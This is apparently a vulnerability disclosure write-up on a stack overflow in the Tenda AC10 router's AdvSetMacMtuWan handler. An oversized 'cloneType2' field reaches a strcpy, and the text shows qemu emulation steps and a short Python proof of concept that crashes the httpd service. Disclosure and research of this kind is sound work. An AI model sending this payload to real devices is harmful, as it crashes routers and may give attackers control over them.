# Tenda-AC10-AdvSetMacMtuWan-cloneType2-StackOverflow

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the Tenda-AC10 router.

By analyzing the webs file in the bin directory, I found that the function 0x45C380 contains a stack overflow vulnerability.

The stack overflow can be triggered by the cloneType2 key value, which leads to a strcpy stack overflow.

![image-20250110175336927](https://gitee.com/xyqer/pic/raw/master/202501130936686.png)

It can be seen that there is a stack overflow in the above function. To call this part of the code, i in the following function needs to be greater than 0.

![image-20250110175310762](https://gitee.com/xyqer/pic/raw/master/202501130938861.png)

It can be seen whether it is triggered is related to v4, and v4 is wans.flag. However, in the case of qemu simulation, the value read from GetValue("wans.flag", v4); is always 0, although the following is the default setting. **But in the real environment, we can make the return value of GetValue("wans.flag", v4); greater than 0. In order to better carry out the attack, I have made the following processing.**

![image-20250110180323210](https://gitee.com/xyqer/pic/raw/master/202501130939237.png)

Thus we can successfully invoke the code where the vulnerability point is located to achieve stack overflow and control the program execution flow.

## How can we simulate a router

﻿Use the following command to simulate with firmAE.

```bash
sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
```

﻿The content of the **poc.py** file is as follows:

```python
import requests
import pwn
url = "http://192.168.229.128/goform/AdvSetMacMtuWan"
data = {
        "cloneType2": "a"*0x300
}

res = requests.post(url,data=data)
print(res.text)
```

## Attack result

![image-20250110180953903](https://gitee.com/xyqer/pic/raw/master/202501101809939.png)

Through the above figure, the value can be obtained. Successfully, a stack overflow has been achieved and a segmentation fault has been triggered.